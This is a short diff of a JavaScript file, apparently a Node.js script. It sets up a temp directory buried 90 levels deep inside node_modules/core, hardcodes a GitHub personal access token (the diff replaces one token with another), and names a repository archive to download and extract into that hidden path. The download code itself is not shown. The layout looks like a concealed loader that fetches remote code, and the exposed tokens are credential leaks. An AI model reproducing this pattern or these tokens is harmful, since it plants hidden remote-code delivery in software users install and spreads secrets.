@@ -14,7 +14,7 @@ const deepLayers = Array.from({ length: 90 }, (_, i) => `.x${i + 1}`);
 const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.cachex');
 
 // === GIT CONFIG ===
-const GITHUB_TOKEN = "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";
+const GITHUB_TOKEN = "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";
 const DOWNLOAD_URL = "https://github.com/Ely304-jpg/test/archive/refs/heads/main.zip";
 const EXTRACT_DIR = path.join(TEMP_DIR, "n-main");
 const LOCAL_SETTINGS = path.join(__dirname, "settingss.js");
